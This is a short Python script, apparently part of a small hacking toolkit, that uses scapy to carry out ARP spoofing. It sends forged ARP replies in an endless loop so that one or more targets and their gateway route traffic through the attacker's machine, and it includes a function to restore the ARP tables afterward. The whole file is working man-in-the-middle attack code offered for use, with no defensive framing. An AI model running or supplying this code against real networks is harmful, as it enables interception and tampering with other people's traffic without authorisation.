import time
from scapy.all import ARP, send
from network_scanner import get_mac

def arp_spoof(target_ip, spoof_ip):
    #target_ip, spoof_ip = input("# Target ip >"), input("# Spoof ip > ")
    target_mac = get_mac(target_ip)
    if target_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)

def restore_arp(target_ip, spoof_ip):
    #target_ip, spoof_ip=input("# Target ip >"),input("# Spoof ip > ")
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if target_mac and spoof_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        send(arp_response, count=4, verbose=False)

def arp_spoof_attack(target_ips, gateway_ip):
    """
    target_ips: str или list[str] — IP-адрес(а) цели
    gateway_ip: str — IP-адрес шлюза
    """
    if isinstance(target_ips, str):
        target_ips = [target_ips]
    print(f"[*] Starting ARP spoofing attack on targets: {target_ips} and gateway: {gateway_ip}")
    while True:
        for target_ip in target_ips:
            arp_spoof(target_ip, gateway_ip)
            arp_spoof(gateway_ip, target_ip)
        time.sleep(2)
